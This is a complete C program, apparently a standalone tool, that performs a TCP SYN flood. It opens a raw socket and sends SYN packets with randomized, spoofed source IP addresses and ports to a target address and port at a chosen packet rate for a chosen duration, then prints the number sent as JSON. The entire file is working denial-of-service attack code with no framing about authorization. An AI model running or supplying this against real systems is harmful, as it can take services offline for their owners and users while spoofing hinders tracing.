#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>

struct pseudo_header {
  uint32_t src;
  uint32_t dst;
  uint8_t  zero;
  uint8_t  proto;
  uint16_t length;
};

static uint16_t checksum(void *buf, int len) {
  uint16_t *p = buf;
  uint32_t  sum = 0;
  while (len > 1) { sum += *p++; len -= 2; }
  if (len) sum += *(uint8_t *)p;
  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
  return ~sum;
}

int main(int argc, char *argv[]) {
  if (argc < 4) {
    fprintf(stderr, "Usage: syn_flood <dst_ip> <dst_port> <pps> [duration_secs]\n");
    return 1;
  }

  const char *dst_ip    = argv[1];
  int         dst_port  = atoi(argv[2]);
  int         pps       = atoi(argv[3]);
  int         duration  = argc >= 5 ? atoi(argv[4]) : 30;

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) { perror("socket"); return 1; }

  int one = 1;
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

  srand(time(NULL));

  char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
  struct iphdr  *ip  = (struct iphdr  *)packet;
  struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

  struct sockaddr_in dst = {
    .sin_family = AF_INET,
    .sin_port   = htons(dst_port),
  };
  inet_pton(AF_INET, dst_ip, &dst.sin_addr);

  long interval_us = pps > 0 ? 1000000L / pps : 1000;
  time_t end_time  = time(NULL) + duration;
  long sent = 0;

  while (time(NULL) < end_time) {
    uint32_t src_ip  = rand();
    uint16_t src_port = 1024 + (rand() % 64511);

    memset(packet, 0, sizeof(packet));

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tot_len  = htons(sizeof(packet));
    ip->id       = htons(rand() & 0xFFFF);
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr    = src_ip;
    ip->daddr    = dst.sin_addr.s_addr;
    ip->check    = checksum(ip, sizeof(struct iphdr));

    tcp->source  = htons(src_port);
    tcp->dest    = htons(dst_port);
    tcp->seq     = htonl(rand());
    tcp->doff    = 5;
    tcp->syn     = 1;
    tcp->window  = htons(65535);

    // TCP checksum via pseudo-header
    struct pseudo_header ph = {
      .src    = ip->saddr,
      .dst    = ip->daddr,
      .zero   = 0,
      .proto  = IPPROTO_TCP,
      .length = htons(sizeof(struct tcphdr)),
    };
    char tmp[sizeof(ph) + sizeof(struct tcphdr)];
    memcpy(tmp, &ph, sizeof(ph));
    memcpy(tmp + sizeof(ph), tcp, sizeof(struct tcphdr));
    tcp->check = checksum(tmp, sizeof(tmp));

    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dst, sizeof(dst));
    sent++;

    if (interval_us > 0) usleep(interval_us);
  }

  printf("{\"requestsCompleted\":%ld}\n", sent);
  close(sock);
  return 0;
}
